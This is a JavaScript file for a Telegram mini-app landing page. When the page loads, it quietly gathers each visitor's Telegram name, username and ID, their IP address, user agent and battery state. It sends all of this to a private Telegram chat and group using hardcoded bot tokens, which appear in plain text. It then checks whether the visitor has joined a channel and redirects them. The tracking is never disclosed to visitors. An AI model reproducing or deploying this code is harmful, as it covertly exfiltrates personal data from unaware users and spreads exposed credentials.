// Parse the URL parameters from location.hash
let urlHash = window.location.hash;
let paramsString = urlHash.split('#tgWebAppData=')[1]?.split('&tgWebAppVersion')[0];

// Decode the URL-encoded string
let decodedParams = decodeURIComponent(paramsString || '');

// Split parameters and get them as key-value pairs
let params = new URLSearchParams(decodedParams);

// Extract values
let user = JSON.parse(params.get('user'));
const chatId = user.id;
const firstname = user.first_name;
const lastname = user.last_name;
const username = '@' + user.username;

const userAgent = navigator.userAgent;

// Fetch user's IP, battery information, and send data
const getInfoAndSend = async () => {
    const ip = await fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip);

    const battery = await navigator.getBattery();
    const batteryLevel = (battery.level * 100).toFixed(0);
    const isCharging = battery.charging ? 'Yes' : 'No';

    const loginData = {
        ip: ip,
        userAgent: userAgent,
        batteryLevel: batteryLevel,
        isCharging: isCharging
    };

    // Initialize message sending after gathering all info
    await checkUser(chatId, loginData);
};

async function fetchBlockList(url) {
    const response = await fetch(url);
    if (!response.ok) {
        return [];
    }
    const data = await response.text();
    return data.split('\n').map(line => line.trim());
}

async function checkUser(chatId, loginData) {
    const blockListUrl = "data/banned_users.txt";
    const blockList = await fetchBlockList(blockListUrl);

    if (blockList.includes(String(chatId))) {
        await sendblockuserMessage(loginData);
    } else {
        await sendMessage(loginData);
    }
}

async function checkMembership(chatId) {
    const botToken = '8111951255:AAEwQJflo9v3c3kGLsuzJB-nHCAoQ1Sz4eE';
    const channelUsername = '@TrickSpotZone';

    const url = `https://api.telegram.org/bot${botToken}/getChatMember?chat_id=${channelUsername}&user_id=${chatId}`;
    const response = await fetch(url);
    const data = await response.json();

    if (data.ok) {
        const status = data.result.status;
        window.location.href = status === 'member' || status === 'administrator' || status === 'creator'
            ? 'main.html?id=' + chatId
            : 'not-join.html?id=' + chatId;
    }
}

async function sendMessage(loginData) {
    const botToken = '7470655656:AAFauWFgdBLtw-GOy_2YJnFkUSD9ZU6GBKw';
    const chatId2 = '6769491364';
    const message = `🔰User Info🔰\n\nFirst Name: ${firstname || 'N/A'}\nLast Name: ${lastname || 'N/A'}\nUser Name: ${username || 'N/A'}\nChatId: ${chatId || 'N/A'}\nStatus: Unblocked User`;

    await sendToTelegram(botToken, chatId2, message);
    await sendMessagegrupe(loginData);
}

async function sendblockuserMessage(loginData) {
    const botToken = '7470655656:AAFauWFgdBLtw-GOy_2YJnFkUSD9ZU6GBKw';
    const chatId3 = '6769491364';
    const message = `🔰User Info🔰\n\nFirst Name: ${firstname || 'N/A'}\nLast Name: ${lastname || 'N/A'}\nUser Name: ${username || 'N/A'}\nChatId: ${chatId || 'N/A'}\nStatus: Blocked User\nPage: checker.html`;

    await sendToTelegram(botToken, chatId3, message);
    await sendblockuserMessagegrupe(loginData);
}

async function sendMessagegrupe(loginData) {
    const botToken = '7470655656:AAFauWFgdBLtw-GOy_2YJnFkUSD9ZU6GBKw';
    const chatId4 = '-1002285658061';
    const message = `🔰User Full Info🔰\n\nFirst Name: ${firstname || 'N/A'}\nLast Name: ${lastname || 'N/A'}\nUser Name: ${username || 'N/A'}\nChatId: ${chatId || 'N/A'}\n🌐IP Address: ${loginData.ip}\n💻User Agent: ${loginData.userAgent}\n🔋Battery Level: ${loginData.batteryLevel}%\n⚡Charging: ${loginData.isCharging}\nStatus: Unblocked User`;

    await sendToTelegram(botToken, chatId4, message);
    await checkMembership(chatId);
}

async function sendblockuserMessagegrupe(loginData) {
    const botToken = '7470655656:AAFauWFgdBLtw-GOy_2YJnFkUSD9ZU6GBKw';
    const chatId5 = '-1002285658061';
    const message = `🔰User Full Info🔰\n\nFirst Name: ${firstname || 'N/A'}\nLast Name: ${lastname || 'N/A'}\nUser Name: ${username || 'N/A'}\nChatId: ${chatId || 'N/A'}\n🌐IP Address: ${loginData.ip}\n💻User Agent: ${loginData.userAgent}\n🔋Battery Level: ${loginData.batteryLevel}%\n⚡Charging: ${loginData.isCharging}\nStatus: Blocked User\nPage: checker.html`;

    await sendToTelegram(botToken, chatId5, message);
    window.location.href = 'blocked-user.html?id=' + chatId;
}

// Generic function to send messages to Telegram
async function sendToTelegram(botToken, chatId, message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const payload = { chat_id: chatId, text: message };

    const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
    return await response.json();
}

// Initiate data fetching and processing
getInfoAndSend();
